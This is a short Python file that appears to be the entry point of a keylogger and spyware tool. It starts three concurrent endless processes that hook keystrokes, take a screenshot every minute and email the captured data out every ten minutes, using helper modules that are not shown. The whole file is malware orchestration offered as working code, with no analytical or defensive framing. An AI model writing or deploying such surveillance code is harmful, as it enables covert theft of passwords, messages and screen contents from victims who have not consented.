import Hook_Keyboard
import PrintScreen
import Email_Connection
import multiprocessing
import time


def keylogger():
    while True:
        Hook_Keyboard.hook_keyboard()


def screen():
    while True:
        time.sleep(60)
        PrintScreen.take_screen()


def email():
    while True:
        time.sleep(600)
        Email_Connection.sendmail()


if __name__ == "__main__":

    proces_3 = multiprocessing.Process(target=email)
    proces_2 = multiprocessing.Process(target=screen)
    proces_1 = multiprocessing.Process(target=keylogger)

    proces_3.start()
    proces_2.start()
    proces_1.start()

    proces_3.join()
    proces_2.join()
    proces_1.join()
